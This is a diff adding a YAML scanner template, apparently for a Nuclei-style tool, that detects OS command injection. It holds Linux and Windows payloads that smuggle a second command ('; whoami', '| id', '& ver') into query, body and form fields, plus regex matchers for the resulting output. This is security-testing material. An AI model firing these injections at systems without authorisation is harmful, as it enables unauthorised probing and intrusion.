@@ -1,0 +1,51 @@
+id: cmdi-basic
+info:
+  name: "Command Injection"
+  severity: critical
+  description: >
+    사용자 입력이 OS 명령어에 삽입될 때 발생하는 취약점.
+    whoami / id 명령어 실행 결과가 응답에 반사되면 취약으로 판정.
+  tags: [cmdi, injection, os-command]
+
+definition:
+  method: [GET, POST]
+  position: [query, body, form_field]
+
+payload_groups:
+  - group: linux_basic
+    engine: "Linux — 명령어 연결"
+    payloads:
+      - "; whoami"
+      - "| whoami"
+      - "&& whoami"
+      - "`whoami`"
+      - "; id"
+      - "| id"
+
+  - group: windows_basic
+    engine: "Windows — 명령어 연결"
+    payloads:
+      - "& whoami"
+      - "& ver"
+      - "| whoami"
+
+matchers_condition: or
+
+matchers:
+  - name: linux_user_output
+    type: regex
+    description: "uid=N(user) gid=N 형식의 id 명령어 출력"
+    regex:
+      - "uid=\\d+\\(.*?\\)\\s+gid=\\d+"
+      - "\\broot\\b"
+      - "\\bwww-data\\b"
+      - "\\bdaemon\\b"
+      - "\\bapache\\b"
+      - "\\bnobody\\b"
+
+  - name: windows_version_output
+    type: regex
+    description: "Windows ver 명령어 출력"
+    regex:
+      - "Microsoft Windows \\[Version"
+      - "Windows_NT"
